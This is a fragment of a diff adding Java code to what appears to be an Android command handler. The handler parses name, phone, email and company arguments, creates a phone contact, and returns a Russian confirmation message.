+			//name:<contact>;phone:<number>;[email:<mail>];[company:<name>]
+			String mail = null;
+			String org  = null;
+			
+			mail = mArgs.strValue("email",null);
+			org  = mArgs.strValue("company",null);
+			String name = mArgs.strValue("name");
+			String phone = mArgs.strValue("phone",null);
+			ContactObj.addContact(mContext, name, phone, mail, org);
+			
+			mCommandResult = String.format("Контакт %s создан",name);
+			
+			return CommandObj.ACK;
+		}
+	}
 }
